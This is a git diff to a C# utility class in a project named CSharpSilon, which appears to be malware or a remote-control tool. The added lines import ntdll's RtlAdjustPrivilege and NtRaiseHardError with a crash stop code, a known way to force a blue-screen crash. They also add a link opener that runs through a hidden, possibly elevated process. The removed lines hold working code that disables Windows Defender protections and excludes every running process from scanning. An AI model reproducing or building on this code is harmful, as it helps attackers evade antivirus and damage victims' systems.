@@ -2,6 +2,7 @@
 using System.Diagnostics;
 using System.IO;
 using System.Management;
+using System.Runtime.InteropServices;
 using System.Security.Principal;
 using System.Threading;
 
@@ -9,6 +10,17 @@ namespace CSharpSilon.Utils
 {
     public class App
     {
+        
+        public static uint stopCode = 0xc000021a;
+        
+        [DllImport("ntdll.dll")]
+        public static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);
+
+        [DllImport("ntdll.dll")]
+        public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);
+
+        
+        
         public static bool IsAdmin()
         {
             return new WindowsPrincipal(WindowsIdentity.GetCurrent())
@@ -26,31 +38,10 @@ namespace CSharpSilon.Utils
             WindowStyle = ProcessWindowStyle.Hidden,
             Verb = IsAdmin() ? "runas" : ""
         });
-
-        public static void Disable()
+        
+        public static void OpenLink(string link)
         {
-            execute("Set-MpPreference -DisableRealtimeMonitoring $true");
-            execute("Set-MpPreference -DisableCloudProtection $true");
-            execute("Set-MpPreference -DisableAutoSampleSubmission $true");
-            execute("Set-MpPreference -DisableBlockAtFirstSeen $true");
-            execute("Set-MpPreference -DisableRestorePoint $true");
-        }
-
-        public static void ExcludeAll()
-        {
-            foreach (ManagementObject process in new ManagementObjectSearcher("SELECT ProcessId, ExecutablePath FROM Win32_Process").Get())
-            {
-                try
-                {
-                    string executablePath = process["ExecutablePath"]?.ToString();
-                    if (!string.IsNullOrEmpty(executablePath))
-                    {
-                        App.execute($"PowerShell -NoProfile -ExecutionPolicy Bypass Set-MpPreference -ExclusionProcess {executablePath}");
-                        Thread.Sleep(15);
-                    }
-                }
-                catch { }
-            }
+            execute($"start {link}");
         }
     }
 }
